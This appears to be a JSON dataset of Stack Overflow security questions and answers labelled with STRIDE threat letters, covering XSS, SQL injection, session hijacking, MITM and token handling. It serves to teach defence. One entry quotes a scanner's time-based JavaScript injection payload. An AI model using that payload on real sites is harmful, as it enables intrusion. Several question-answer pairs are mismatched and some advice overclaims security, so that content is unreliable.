    "Mitigation": " With that line of code  [CODE]  ...the server application echoes back the data that was submitted to it via the \"js\" key. It will be client that sent it that will receive it, so if in some way it is malicious, it will be that same client dealing with the consequences.  The actual sending to the server is in fact the irrelevant part of the chain: if one has the data to submit, one can also assign it to the variable [CODE] directly without the server's interference (e.g. through browser's dev tools).   It would be a different story if in PHP you would use the data to manipulate a server database, call a service, or otherwise change the application's state, and you would not first validate that data.  As to the use of [CODE]: if indeed you verify that the argument is valid JSON (by checking that the return value is not [CODE]), it will produce a valid JavaScript object literal. The known cases of incompatibility (characters [CODE] and [CODE]) will not occur, as by default [CODE] escapes these characters. "
  },
  {
    "Threat": "I",
    "Attack": " I have always thought that as the data was being passed internally in the same computer, the risk of interception was zero.  Is this not the case, then?  should I be encrypting in PHP before storing the data?  As you have guessed, it is kind of pointless to use SSL for local connections. SSL's main purpose is to encrypt the channel so as to prevent man-in-the-middle-like attacks. But there can be no man in the middle in case of local connection. In you setup, I would recommend a connection through a [LINK], and bypass the TCP layer altogether.  In the latter case (untrusted link to a remote database), [CODE] is not suitable. The encryption/decryption process is done by MySQL. The data transits unencrypted between PHP and MySQL. Also, as one must pass an encryption key to MySQL's [CODE] and [CODE], this key will typically be sent unencrypted along with the rest of the SQL query. ",
    "Mitigation": " As you have guessed, it is kind of pointless to use SSL for local connections. SSL's main purpose is to encrypt the channel so as to prevent man-in-the-middle-like attacks. But there can be no man in the middle in case of local connection. In you setup, I would recommend a connection through a [LINK], and bypass the TCP layer altogether.  Now back to the question.    Should I be encrypting in PHP before storing the data?  No, if the database is on the same machine as the one that executes the script.  No, if the database is remote, and if the link is trusted (either you trust the link per se, or the link is secured eg. with SSL). "
  },
  {
    "Threat": "E",
    "Attack": " How can I display the \"Welcome, [Your Name]\" on public pages for authenticated users, even if they use HTTP? Of course, I would like to keep the access to the sensitive pages safe, and I should therefore keep [CODE] to avoid possible stealing of the session token. ",
    "Mitigation": " You cannot both secure the session cookie with [CODE] and allow full access to the session over HTTP. If there is a subset of the session information (such as the user's name) that you don't mind exposing over HTTP, it's possible to create an additional, non-secure cookie to allow access to that from your public pages. That idea is discussed in [LINK].  As you see in that discussion (see [LINK] as well), most security-conscious developers encourage using HTTPS at all times. That will be the simplest and most secure route, and nowadays does not incur much extra cost.  If you decide to stick with allowing HTTP access, be sure to make use of the other security measures that Django exposes (e.g. [LINK] and CSRF settings). "
  },
  {
    "Threat": "T",
    "Attack": " I'm trying to protect a Classic ASP web application from HTTP Header Injected XSS attacks and am having trouble finding a solution that stops scripts found in the User Agent String.  ",
    "Mitigation": " The issue was from the user agent string (with the malicious script) being rendered on the page at the bottom for debug purposes. If you're having this issue, please check that you aren't displaying the object with the bad script on the page.   If you are, than remember to use HTML Encoding to render it safely.   Thanks to the_lotus and Lankymart for the quick answers.  "
  },
  {
    "Threat": "I",
    "Attack": " I rely on $_GET['img'] to determine which image to retrieve, which is a possible security hole (and a major one at that). I could forsee a directory traversal attack, hence the use of realpath, though I'm sure there can be other avenues of attack I do not contain with this script.  For that reason, I'd prefer if I could move getimage.php outside of webroot, or at least prevent it from being accessible directly (and only through gallery.php, where the sent img parameter is strictly under my control).  So, long story short: what do I need to do to prevent getimage.php from being abused? ",
    "Mitigation": " You need to allow Apache (assumed) to access that folder with images using Directory directive ([LINK]).  Or you can move images under root directory and restrict direct access to them using .htaccess if you want to keep them protected. "
  },
  {
    "Threat": "S",
    "Attack": " I read (almost) all the answers on verifying in-app purchase, and actually I already implement it in a server-side fashion. But managing a server sometimes could be too much expensive, and in theory you could do the verify from your app: basically is just sending a json to Apple and get the answer back.Of course I know that on jailbroken devices the receipts may be fake (that's why you verify them) but (I beg pardon my ignorance) why I can't trust an https connection to the Apple server?I mean if the user hack my app, there's no real way to be sure of anything, but if the hack is a general method to provide fake receipts testing with Apple could be enough right? ",
    "Mitigation": " [LINK] explains quite well why you must use server side checking to limit the effect of some \"general purpose\" crackers, like \"IAP cracker\"; besides chaining the iTunes json request in your content delivery API is quite convenient and the answer is fast.   Of course if your aim is to provide some content already in the app but locked, you may feel it is not convenient to setup a server specifically for this, but I will ask you to do this experiment:  make an app with some good content and this content already locked in the app (so no content server need)add some analytics just to track the usage of this locked featureafter some month, compare the number of purchases with the number of new users using the paid feature.at this point it will be clear for you that adding a server script just for receipt validation is a good investment; besides there are some services, which are very cheap (e.g.: urban airship) we already do this for you, so you don't need to setup an hardware for this. "
  },
  {
    "Threat": "I",
    "Attack": " The following [LINK] discusses how to destroy a flask token, however this does not prevent a man in the middle attack.  Is there anyway to invalidate the token so it is no longer active before the time it expires? ",
    "Mitigation": " The tokens shown in the question you referenced are created by adding a cryptographic signature to some data. Typically the data stored in a token includes the token owner (for example the user id), and can also include an expiration date.  The nice thing about these tokens is that all the useful data is stored inside the token, so you do  not need to store anything in your database. You just pass the token to the client, and when the client sends it back you decode it and use the information in it to know who the client is.  The downside of this approach is that there is no simple way to revoke a token, because tokens are not stored anywhere. To extend this mechanism to allow revocation, you can add a database table where revoked tokens are stored. Then during token validation you not only decode the token, but also make sure that the token is not in your revoked list.  Another, completely different approach is to not use signed tokens. Just make the token a random UUID and store it in the user table for each user. If you index it, then when the client sends the token you can locate the user with a database search. And then revoking a token is simply done by clearing the token field for the user.  I hope this helps! "
  },
  {
    "Threat": "T",
    "Attack": " However my concern is with the security of this method since users could tamper with the queries and do things you don't want them to do or request data you do not want them to see. ",
    "Mitigation": "   <h3>Introducing easy JavaScript data access</h3>    So you want to rapidly prototype a really cool Web 2.0 JavaScript application, but you don't want to spend all your time writing the wiring code to get to the database? Traditionally, to get data all the way from the database to the front end, you need to write a class for each table in the database with all the create, read, update, and delete (CRUD) methods. Then you need to put some marshalling code atop that to provide an access layer to the front end. Then you put JavaScript libraries on top of that to access the back end. What a pain!  [LINK] article presents an alternative method in which you use a single database class to wrap multiple database tables. A single driver script connects the front end to the back end, and another wrapper class on the front end gives you access to all the tables you need.  <h3>Example/Usage</h3>  [CODE] "
  },
  {
    "Threat": "T",
    "Attack": " I am not trying to forward these news but I am trying to prevent myself and other teammates to identify if a package from PyPI has not been altered by an external party. ",
    "Mitigation": " First, the article describes the danger of typosquatting, which is caused by developers blindly installing package by name without checking if it's the correct upstream package. You can avoid this by going to the author's GitHub repository and copy the install instructions correctly.Aside from that, packages can be tampered but unlikely. As the PyPI files are transferred through HTTPS, it doesn't make much sense to fetch a hash from server and verify it. (If the author's account or the PyPI server is hacked, hash doesn't prevent you from installing malicious packages.)If you need extra security measure against server compromise, use pinned version/hashes. See the [LINK] for details. "
  },
  {
    "Threat": "T",
    "Attack": " I'm trying to make a PHP application I've written secure and have a question about escaping output. I switched to using prepared statements with PDO once I learned doing so would prevent SQL injections, and it seems that the other main type of attack is XSS. I build the output for my pages like this (assume the variables have data from the database in them):  XSS preventionConverting special characters to proper HTML entities, for example it converts the copyright character to [CODE]. In HTML content you should use the appropriate HTML entity instead of inserting a raw special character.  For XSS prevention, you could use [LINK] instead, but it will only convert some basic characters to HTML entities, namely quotes, ampersand and the less than/greater than characters. ",
    "Mitigation": " There are two benefits to using [LINK]:  XSS preventionConverting special characters to proper HTML entities, for example it converts the copyright character to [CODE]. In HTML content you should use the appropriate HTML entity instead of inserting a raw special character.  For XSS prevention, you could use [LINK] instead, but it will only convert some basic characters to HTML entities, namely quotes, ampersand and the less than/greater than characters.  In answer to your question, you should use [CODE] when outputting any content that could contain user input or special characters. "
  },
  {
    "Threat": "T",
    "Attack": "   \"The ctl00%24txtTopQckSearch parameter appears to be vulnerable to  server-side JavaScript code injection attacks. The submitted value  appears to be placed into a dynamically evaluated JavaScript  statement, within a single-quoted context.    The payload '+(function(){if(typeof cb715===\"undefined\"){var a=new  Date();do{var b=new Date();}while(b-a&lt;20000);cb715=1;}}())+' was  submitted in the ctl00%24txtTopQckSearch parameter. The application  took 7641 milliseconds to respond to the request, compared with 5625  milliseconds for the original request, indicating that the injected  JavaScript code caused a time delay.    Please note that to manually reproduce this behavior using the  reported request, you will need to change the name of the canary  variable, which is currently cb715.\" ",
    "Mitigation": " The report refers to a [CODE] control and says that it passed in the value [CODE] for that control.  So you can try to recreate it by   Figuring out which page is using a control with that nameEntering that JavaScript into that control (but changing the two occurrences of [CODE] to a different name)Submitting the page   If the scan's findings are correct, that request should take slightly longer than a request that doesn't use that value.    How can it be prevented?  Track down the [CODE] control and ensure that values received via that control are never concatenated into any code that is executed on your server.  I think it's entirely possible that this is a red herring and that the request just took a bit longer due to some fluctuation on your server (the fact that the \"safe\" request to that page took >5 seconds suggests that the page might have some performance problems).   One good reason to suspect that it is a red herring is that if that code had run to completion before your server sent back a response, the difference in response time would have been 20 seconds as opposed to the 2 second difference that the scan observed.  "
  },
  {
    "Threat": "I",
    "Attack": " It is easy to steal session id cookies with javascript functions planted in trusted sites by other users. What are the possible counter-measures for this kind of attack?   Rejecting all javascript scripts on the client-side is probably difficult because almost all sites use js. What are the possible counter-measures on the server-side? Is it possible to include a hash of the client ip-address in the session id value to prevent that a valid session id be used from another host? Does this approach make sense? ",
    "Mitigation": " This can block session hijacking in some situation, but in situation where the attacker computer and victim computer are on the same network, it won't do anything since the connection comes from the same IP address.  Using SSL will help prevent session hijacking if a person is connected to a public network.  You can review your code and make sure you have no [LINK] flaw in your code.  You can also make sure the cookie used to stored the session has the [LINK] flag. "
  },
  {
    "Threat": "T",
    "Attack": " I know this is a broad question, but I think I'm missing something here. Is it possible for an attacker to cause damage to a site by simple using inspect element and editing the javascript and html? For example, it seems too easy for someone to change the maxlength of an input, and upload so much data that it could crash the server, I know that it is always good practice to check data at the server but it still seems too easy. Or another more potentially dangerous example is if the attacker can mess with an [CODE] call and send bad info to the server. Is it something I should be worrying more about or are the changes just temporary, on the attackers browser? ",
    "Mitigation": " The standard rule is to never trust input coming from the user / browser.  Do not trust the value of hidden fields, do not trust that they have not changed the length, do not trust that they have not added new values (e.g. to a drop down), do not trust any validation that has been done in Javascript, etc.  Some examples:  Some shopping sites in the past would include the amount to be paid as a hidden field in the form.  Changing this value changed the amount charged to a credit card while still approving the transaction.Sites with Javascript validation rules that could be skipped by posting directly to the backend service opening themselves up to SQL and HTML / Script injection attacks.Drop downs, radio button, and checkbox inputs where unexpected values can be added to the form. "
  },
  {
    "Threat": "T",
    "Attack": " I have read (and am coming to terms with) the fact that no solution can be 100% effective against XSS attacks. It seems that the best we can hope for is to stop \"most\" XSS attack avenues, and probably have good recovery and/or legal plans afterwords. Lately, I've been struggling to find a good frame of reference for what should and shouldn't be an acceptable risk.  I can see that using an html sanitizer can also be very effective in lowering the avenues of XSS attacks if you need the user-input unvalidated.  However, in my case, it's kind of the opposite. I have a (very limited) CMS with a web interface. The user input (after being URL encoded) is saved to a JSON file, which is then picked up (decoded) on the view-able page.  My main way for stopping XSS attacks here is that you would have to be one of few registered members in order to change content at all. By logging registered users, IP addresses, and timestamps, I feel that this threat is mostly mitigated, however, I would like to use a try/catch statement that would catch the YSOD produced by asp.net's default request validator in addition to the previously mentioned methods. ",
    "Mitigation": " I believe the ASP.NET request validation is fairly trustworthy but you should not rely on it alone.  For some projects I leave it enabled to provide an added layer of security.  In general it is preferable to use a widely tested/utilized solution than to craft one yourself.  If the \"YSOD\" (or custom error page) becomes an issue with my clients, I usually just disable the .NET request validation feature for the page.    Once doing so, I carefully ensure that my input is sanitized but more importantly that my output is encoded.  So anywhere where I push user-entered (or web service, etc. -- anything that comes from a third party) content to the user it gets wrapped in Server.HtmlEncode().  This approach has worked pretty well for a number of years now.  The link you provided to Microsoft's documentation is quite good.  To answer your question about what is considered markup (or what should be considered markup) get on your hacker hat and check out the OWASP XSS Evasion Cheat Sheet.  [LINK] "
  },
  {
    "Threat": "T",
    "Attack": " I have heard that it's possible to trigger XSS attacks through CSS ([LINK], [LINK]). ",
    "Mitigation": " CSS  Apart from an actual XSS-threat, passing user-input to a style-tag on your page opens op a whole set of other opportunities for attackers, some by just using plain css.  By setting the element to [CODE], one could overlay your whole page with it. This could be used to just render it unusable (with [CODE] for example) or an attacker could use it for a defacement of the whole page. By using CSS3-properties like [CODE] and [CODE], they are even capable of putting content on your page through CSS.  Another outcome could be \"click-jacking\", this was actually already discussed [LINK].  XSS  When it comes to pure XSS though, it would be hard to use this on modern browsers, still I wouldn't say that it's impossible.Anyhow, on older browsers like, for example, Internet Explorer 7, this could be used for an attack. There have been very creative XSS-Injections that where obfuscated and decoded in the craziest ways to outsmart input-validation, which would still succeed on several (now) old browsers because they were still parsing it. Matters got a lot better on modern browsers considering this.  Additionaly, there where functions like [CODE] and [CODE], which made script-execution possible in CSS for old versions of Firefox, IE7 and older and probably some other browsers.  The [LINK] actually lists an example, where these functions are used in style - tags and style - attributes.  Scriptless Attacks (might work on modern browsers too!)  Putting old browsers and XSS aside, there still are other ways that may be applicable here, mostly in the form of \"Scriptless Attacks\". Going into detail would blast the scope here, but there is a [LINK], providing several ways and good examples on how even modern browsers could be affected. Another example would be [LINK] where CSS was used for Cross Site Request Forgery. (a big thanks to @BenjaminGruenbaum for providing the links)  Finally, for a great insight on how crazy clever attackers can get when it comes to script-insertion, I recommend browsing [LINK]. For example, there's even a pretty [LINK], stated to work on \"on IE7 and Firefox (no version given)\". "
  },
  {
    "Threat": "I",
    "Attack": " Malicious users could post twitter status updates masquerading as coming from my app. There is no twitter account to hijack and start posting status updates on.  Malicious users could create links on my bit.ly account. They would need to do a separate attack to brute-force or otherwise gain the password to login to the account.  I could then start doing silly concatenation / xor-ing in the code to recreate the API key in memory, and the attacker would have to do a bit more work to recover any keys in the binary. My concern with that is that I'm not a cryptographer and would create an embarrassingly weak form of obfuscation there. ",
    "Mitigation": " The secure way to solve this is create your own server, keep the secret stuff server side, and use your own server from your app, and the server then relays to the other webservice. This way the attacker never has access to the secret. "
  },
  {
    "Threat": "I",
    "Attack": " If a web server and a database server are on different hosts, is it possible for a hacker to do packet sniffing or use some other method to get the database username/password when you use mysql_connect in the PHP code? ",
    "Mitigation": " Yes mysql_connect() can be sniffed. The password is [LINK],  but this will not stop an attacker.  All quires are thrown over the wire in plain text and the authenticated session can be hijacked if you are sniffing TCP sequence id's.    You must use full transport layer encryption which is possible using the [LINK] if you are worried about this attack.  If you are putting a mysql connection over the internet or otherwise untrusted network then this is a necessity.  This is not necessary if you are connecting via localhost.  "
  },
  {
    "Threat": "T",
    "Attack": " I'm new into REST APIs and developing an API that is going to be used for iOS/Android/Web apps, but I'm unfamiliar with the kind of threats the APIs face once published.I see these same tips all over:Use oAuth 2 to allow transactions,Receiving and sending only encrypted JSON Web Tokens,Use SSL/TTL.I think using SSL/TLS and JWT should be enough security for sending/receiving data, but even with that, I fear the possibility of SQL injection if someone stole credentials.Should I check the requests for SQL injection strings ([LINK])?And if I'm going to support user login, would it make more sense to use oAuth instead of JWT? ",
    "Mitigation": " sql-iusing prepared statements will get you a lot of the way ([LINK])consider using ORM layers to interface with your db (eg: [LINK])security principlesalways validate user input before performing any operations on itfor every operation, if you know of the universal set of options, opt for an allow-list approach vs a deny-list approach (i.e., I will only allow a string to pass through if it belongs to my known list)authjwt is just a token format (similar to your identity card), and you can use oauth for the underlying authz (checking your identity card before giving you access to some resource) -- read more [LINK]bearer tokens (like jwt) should always be sent over TLS/SSL to prevent intruders from getting access to the plaintext jwt ([LINK])as the product matures, you might want to move to a model where you start assigning session tokens that are stored on the phone, but this usually comes with the complexity of handling revocation (eg: when/how do I rotate session tokens?) "
  },
  {
    "Threat": "T",
    "Attack": " I am trying to protect my website from Cross-Site Scripting (XSS) and I'm thinking of using regular expressions to validate user inputs.  ",
    "Mitigation": " Please read over the [LINK] for a broad array of information. Black listing tags is not a very efficient way to do it and will leave gaps. You should filter input, sanitize before outputting to browser, encode HTML entities, and various other techniques discussed in my link. "
  },
  {
    "Threat": "S",
    "Attack": " I'd like to make it both easy to use from client-side javascript apps and secure against forged request attacks. Is there a best practice to follow here? ",
    "Mitigation": " If domain.com is a shared domain then every part should have their own subdomain, and no one should use the main domain, that is a must for keeping all sessions separate.  If domain.com is a private domain it doesn't matter. "
  },
  {
    "Threat": "I",
    "Attack": " Above said, anything you do is subject to a man in the middle attack. This is the case for lots of sites, so cookie hijacking is a problem all around. ",
    "Mitigation": " When doing anything special, require the user to enter their password again / which should be done over https. If you need to do a series of special operations, you can do that once but from then on requests/cookies need to be sent over https. In this context, you could emit a modified forms authentication cookie, that allows access to the special operations and has require https on.    I believe in MVC, using &lt;%: %> tags in a view does the same thing.  Yes, that's kind of the equivalent to &lt;%= Html.HtmlEncode(someString) %> / with something extra to prevent double encoding (should look into that).    Use regEx to find and remove eval() function calls.  In .net you don't have such a shorthand with so broad access. If you are not explicitly doing anything out of the ordinary, you are likely ok.    Directory Traversal (probably related to the above)  Use MapPath and similar. It actually prevents going outside of the site folder. This said, avoid receiving paths altogether, as you can still give unintended access to special files inside the asp.net folder. In fact, this is part of what happened to a Microsoft handler in the padding oracle vulnerability out there - more on [LINK]    You can add CSRF to the list.  Use the anti forgery token: [LINK]    padding oracle attack:  Apply the work arounds &amp; then the patch as soon as its out.   Learn about all that I mention here: [LINK]. Understanding all that's in there is important, specially if you use any of the features i.e. you don't want to be the one putting sensitive data in the view state :) "
  },
  {
    "Threat": "S",
    "Attack": " However, I fear somebody might decompile my app, register and then \"scan\" my entire database by simply sending requests with different gps data that doesn't actually come from an iOS device. Is there any way to prevent this? I've googled already and found this threat:  I've looked into API keys but didn't find a way how to stop a malicious user from gaining access to the API through registering/ decompiling and then use his login information along with the key from the code. ",
    "Mitigation": " First thing to consider is some form of authentication. But guessing you already considered that, it might not be applicable to your app.  My approach was to check and restrict the number of queries that can originate from a certain origin for a day. Calculate based on refresh intervals, what amount of data you would expect to be pulled from your backend, put some 10% on top of that, and stop providing data to that destination once exceeded, and sent an email to the admin about the event so he can look into it, and maybe ban the client permanently.  As stated in a comment before, not waterproof either, but it works in a device agnostic way, and the harder you make it to abuse, the better it is. "
  },
  {
    "Threat": "T",
    "Attack": " While Option 1 is open to an SQL injection attack, since my SPROC is being called from an authenticated source, does it really matter? Only trusted sources will execute this SPROC, so if they choose to bugger up the database, that is their prerogative. ",
    "Mitigation": " What database are you using? in SQL Server you can create a split function that can split a long string and return a table sub-second.  you use the table function call like a regular table in a query (no temp table necessary)  You need to create a split function, or if you have one just use it.  This is how a split function can be used:  [CODE]  [LINK] but there are numerous ways to split strings in SQL Server, see the previous link, which explains the PROs and CONs of each.  For the Numbers Table method to work, you need to do this one time table setup, which will create a table [CODE] that contains rows from 1 to 10,000:  [CODE]  Once the Numbers table is set up, create this split function:  [CODE]  You can now easily split a CSV string into a table and join on it:  [CODE]  OUTPUT:  [CODE]  Your can use the CSV string like this, not temp table necessary:  [CODE] "
  },
  {
    "Threat": "I",
    "Attack": " I understand that passwords should be encrypted using a 1-way hash function with salt.  This is especially true for user supplied passwords as users typically re-use them over and over again.  If the database was stolen, a thief might be able to gain access to user user accounts on 3rd party websites such as: utility bills, social networks, even potential for online banking.  Because the temporary password would be machine generated, if the database was stolen, the thief would not be able to access any 3rd party websites that the users log into.  The thief would however be able to login to the application that generated the temporary passwords. ",
    "Mitigation": " You should not store even machine generated passwords in plain text.  Let's see what an attacker can do, if he somehow gains only read access to your database with SQL-injection (i made a small [LINK] how easy SQL-injection can be, just click the next-arrow to get a malicious input).  The attacker with read access, could demand a password reset for any e-mail address he likes. Because he can see the new generated token in the database, he could call the reset page with this token and therefore can change the password of this user. Unnecessary to say, that he can now impersonate the original user.  Handle the token just like every other password, even if it can not be used on other sites. The data accessible by the user-account could contain other data (like birthday, real name), that can be used to hack other sites. "
  },
  {
    "Threat": "T",
    "Attack": " In old versions of PHP you had to worry about CRLF injection which is \\r\\n.  This is a \"header response splitting vulnerability.\"  If you strip out these characters then you shouldn't have to worry.   In the latest build of of PHP the header() function is safe,  and will automatically take care of \\r\\n for you.  ",
    "Mitigation": " In old versions of PHP you had to worry about CRLF injection which is \\r\\n.  This is a \"header response splitting vulnerability.\"  If you strip out these characters then you shouldn't have to worry.   In the latest build of of PHP the header() function is safe,  and will automatically take care of \\r\\n for you.  "
  },
  {
    "Threat": "S",
    "Attack": " My concern is that someone can simply figure out the URL that my app uses and pass their own URL parameters - and since the webapp has no idea whether legitimate data is being sent from my iOS app vs. someone just typing in the properly crafted URL from any web browser, the system will be vulnerable.  Of course, the user that the app uses to make database queries will have limited privileges, so the rest of the database won't be at risk. However, even having users activating their accounts from outside the app would be catastrophic. ",
    "Mitigation": " As stated before, there is no 100 % security possible. But there are several solutions that put together give great security.   <h2>Https</h2>  As you point out, this is an important part , as it prevents sniffing.   <h2>Sessions</h2>  Use sessions and don't allow any request without a valid session ( except the first, that must authenticate the app ).   <h2>Fingerprint</h2>  Check the user agent and set extra http headers, to get a fingerprint unique to your app. ( Still someone could sniff, but he needed to use curl or similar. )  <h2>Obfuscate requests</h2>  Build your query string and apply a hash function. The server needs to implement the reverse function. ?43adbf764Fz instead of ?a=1&amp;b=2  <h2>Encrypt</h2>  This goes a step further. Use a shared secret to calculate a hash. On the server repeat the same. This is already strong security. In order to break, one needs to reverse engineer your app.   <h2>Use unique shared secret</h2>  You say it is a app for iOS. Upon installation a unique token is generated by iOS. Have your app register this token with your server. Like this you have a strong shared secret unique to each installation, and there would be no way to hack your web app.  "
  },
  {
    "Threat": "T",
    "Attack": " It's pretty easy to crash MS SQL having even max. restricted access. Exposing SQL and database structure to end users is not a good idea anyway; it's a bad design.SQL is too complicated to non-programmers, and, therefore, it won't make their life easier. ",
    "Mitigation": " You can make some things safer by not just limiting users to read-only access, but also by turning on the [LINK].  That will attempt to do some cost analysis of the queries prior to running them, and if they exceed the predefined threshold it will refuse to run them.  Even better than this would be to have a cloned database available for querying.  This could be something as simple as a separate server running off of a backup of the production system.  Depending on how \"live\" your data needed to be, you could adjust the backup/restore interval accordingly.  As far as whether it's a good idea to expose the database to direct querying for non-programmers, that still depends on just how savvy the users are.  Could they be taught SQL?  It's really not that hard for simple things. "
  },
  {
    "Threat": "T",
    "Attack": " I want to give end users the ability to save HTML to my backend store.  Since this feature could easily cause SQL Injection, and loads of other issues, does anyone know of a server side library that will clean the input so only the \"safe\" parts of HTML can be used? ",
    "Mitigation": " Consider sanitizing user input with the Microsoft AntiXSS library.  [LINK][LINK] "
  },
  {
    "Threat": "S",
    "Attack": " What is the best way to protect the user and secure for any MITM attacks. Is my way secure enough? ",
    "Mitigation": " By far the easiest solution is to simply use SSL/TLS. Since you mentioned 'post', that means you're probably using HTTP. Instead, you could just connect via HTTPS and post the data, exactly the same as you're doing already. Long as the certificate is checked for validity (I believe the iOS framework already does such by default), then the connection should be largely secured.  That should be good enough for most situations. There are some more complicated and involved techniques you can use to harden further, but SSL/TLS does a massive amount on its own. "
  },
  {
    "Threat": "T",
    "Attack": " I am developing an iOS app that it has to store username and password and other sensitive data. I am considering using NSUserDefaults or keychain storage. Are there other more secure method to keep attackers from defeating iOS keychain or such data protection?  ",
    "Mitigation": " There's a good read-up on this whole security topic [LINK], it's an older article but anyway. I personally think that the whole security concept on apples iOS platform together with hardware encryption on iOS devices is really good. Android and Android devices are problematic as we all know.   But adding additional security measures, by encrypting your data additionally, is not a bad idea anyway!  "
  },
  {
    "Threat": "S",
    "Attack": " My question is which scenario is more safe, for example against making false requests as other user. For scenario 1, does the Security Component allow manipulating input values through Firebug or some other software? ",
    "Mitigation": " Yes, the security component adds automatic prevention of form tampering:  From the [LINK]:    By using the Security Component you automatically get CSRF and form  tampering protection. Hidden token fields will automatically be  inserted into forms and checked by the Security component. Among other  things, a form submission will not be accepted after a certain period  of inactivity, which is controlled by the csrfExpires time.  As stated in the other answer, you can use the [CODE] option when saving your data instead. With the security component, however, you would be able to add the [CODE] as a hidden field (scenario 1) and not worry about its value being tampered with. This would prevent the necessity to set it in the controller (scenario 2). "
  },
  {
    "Threat": "S",
    "Attack": " Let's imagine the following scenario: the middle man gets request from victim: http ://site.com. Then he fires HTTPS request himself to https ://site.com and returns content to the user, stripping the HSTS header. All further user input is visible to the attacker.  Does HSTS header really help against MITM attacks? ",
    "Mitigation": " HSTS helps only if the user agent has visited the site before and there was no interference from a MITM at the time of the first visit. In order words, you are vulnerable the first time you go to the site, but never again.  Since you are still vulnerable the first time, HSTS is far from perfect. But it's better than nothing, since it does protect from an attacker who targets you AFTER you have already visited the site before.  (Except if the user was careful to use https the first time: in that case they are protected the first time and also protected against forgetting to use https on all subsequent visits.) "
  },
  {
    "Threat": "T",
    "Attack": " I want to allow users to make their own Python \"mods\" for my game, by placing their scripts in a special folder which the game \"scans\" for Python modules and imports.What would be the simplest way to prevent \"dangerous\" scripts from being imported? I don't want people complaining to me that they used someone's mod and it erased their hard drive.Things I would like to limit is accessing/modifying/creating any files outside of their folder and connecting to the internet/downloading/sending data. If you can thik of anything else, let me know. ",
    "Mitigation": " Restricted Python seems to able to restrict functionality for code in a clean way and is compatible with python up to 2.7.  [LINK]  e.g.    By supplying a different __builtins__ dictionary, we can rule out unsafe operations, such as opening files [...] "
  },
  {
    "Threat": "T",
    "Attack": " I found a couple vBulletin sites I administer getting hacked recently. They use the latest version of the 3.8 series (3.8.7 Patch Level 2). I am usually pretty good at finding the holes where they get in and patching them up, but this one is stumping me.  They are injecting data into the MySQL tables. The attack always happens when they make a GET request to the [CODE] script. I was able to save data when the attack occurs.  This was the [CODE], [CODE], [CODE], [CODE], and [CODE] arrays.  The only thing I saw that looked out of place is that there were two new [CODE] keys, [CODE] and [CODE]: ",
    "Mitigation": " A variable like [CODE] can set by just adding headers to the HTTP request.  A simple command line example would be:  PHP Page:  [CODE]  Then on command line:  [CODE]  You'll see that [CODE] is equal to [CODE].  In this case, the contents of HTTP_SOVIET are base64 encoded (give away, it ends in [CODE]).Unencoded, it turns into:  [CODE]  It's worth noting that query there:  [CODE]  Check your style table, as that's one way/the way code is exposed to the user.  Renaming your style table to something else would likely mitigate the effects of this attack for now.  In there, the base64 bit has more bas64 in, which has more bas64 in which eventually evals:  [CODE]  This writes to a file called [CODE], so I'd check what that says.  It also hides it's behaviour from search engines, which is nice of it.  The bad bit for users is likely:  [CODE]  Which puts some JS on the page hosted by [CODE]. That JS requires a key based on the IP address.  I'd check any code that reads/executes the contents of random $_SERVER variables, but why that would be in there, I don't know. "
  },
  {
    "Threat": "T",
    "Attack": " Anyone know if jsbin.com implements any protection for XSS or other javascript attacks?  I guess an unfriendly script could do a denial of service on jsbin by continually scripting a \u9225\u69aeave to public URL\u9225?submission to clog the database up. And of course anyone could post a security hole exploit script which would infect people with old browsers and plugins; that might also get jsbin on Google's blocklist. ",
    "Mitigation": "   I should probably be more careful about which links I choose to click. "
  },
  {
    "Threat": "S",
    "Attack": " If your user ID is a sequential number, this is pretty insecure as anyone can just change their cookie to another reasonable-looking number based on their own (e.g. if mine is 1274, I could try some other numbers in that range) and immediately spoof that user. ",
    "Mitigation": " You would be better off assigning a temporary ID associated with that user, like a [LINK]. Since GUIDs are astronomically unique and practically collision-proof, they're also virtually impossible to guess or predict from outside the system.   When the user logs in, you create a new GUID and store that with the user:  [CODE]  When a user returns, look up their user ID by the token, make sure the token hasn't expired and log them in. Then change their token. This secures you against the following:  An attacker cannot guess another user's token and spoof themToken expiration cannot be circumvented by ignoring the cookie's expiration dateSince tokens change constantly, even if an attacker does manage to gain access to a user's cookie, the window of opportunity to take over is very small. "
  },
  {
    "Threat": "I",
    "Attack": " Additional question: How to avoid attackers to steal the token from a cookie? ",
    "Mitigation": " <h2>How token-based authentication works</h2>In a few words, an authentication scheme based on tokens follow these steps:The client sends their credentials (username and password) to the server.The server authenticates the credentials and generates a token.The server stores the previously generated token in some storage along with the user identifier and an expiration date.The server sends the generated token to the client.In every request, the client sends the token to the server.The server, in each request, extracts the token from the incoming request. With the token, the server looks up the user details to perform authentication and authorization.If the token is valid, the server accepts the request.If the token is invalid, the server refuses the request.The server can provide an endpoint to refresh tokens.<h2>How to send credentials to the server</h2>In a REST applications, each request from client to server must contain all the necessary information to be understood by the server. With it, you are not depending on any session context stored on the server and you do not break the [LINK] of the REST architecture defined by Roy T. Fielding in his [LINK]:[LINK][...] each request from client to server must contain all of the information necessary to understand the request, and cannot take advantage of any stored context on the server. Session state is therefore kept entirely on the client. [...]When accessing protected resources that require authentication, each request must contain all necessary data to be properly authenticated/authorized. It means the authentication will be performed for each request.Have a look at this quote from the [LINK] regarding considerations for new authentication schemes:[LINK]There are certain aspects of the HTTP Authentication Framework thatput constraints on how new authentication schemes can work:HTTP authentication is presumed to be stateless: all of theinformation necessary to authenticate a request MUST be providedin the request, rather than be dependent on the server rememberingprior requests. [...]And authentication data (credentials) should belong to the standard HTTP [LINK] header. From the [LINK]:[LINK]The [CODE] header field allows a user agent to authenticateitself with an origin server -- usually, but not necessarily, afterreceiving a [CODE] (Unauthorized) response.  Its value consists ofcredentials containing the authentication information of the useragent for the realm of the resource being requested.[CODE][...]Please note that the name of this HTTP header is unfortunate because it carries authentication data instead of authorization. Anyways, this is the standard header for sending credentials.When performing a token based authentication, tokens are your credentials. In this approach, your hard credentials (username and password) are exchanged for a token that is sent in each request.<h2>What a token looks like</h2>An authentication token is a piece of data generated by the server which identifies a user. Basically, tokens can be opaque (which reveals no details other than the value itself, like a random string) or can be self-contained (like JSON Web Token):Random string: A token can be issued by generating a random string and persisting it to a database with an expiration date and with a user identifier associated to it.JSON Web Token (JWT): Defined by the [LINK], it's a standard method for representing claims securely between two parties. JWT is a self-contained token and enables you to store a user identifier, an expiration date and whatever you want (but don't store passwords) in a payload, which is a [LINK] encoded as [LINK]. The payload can be read by the client and the integrity of the token can be easily checked by verifying its signature on the server. You won't need to persist JWT tokens if you don't need to track them. Althought, by persisting the tokens, you will have the possibility of invalidating and revoking the access of them. To keep the track of JWT tokens, instead of 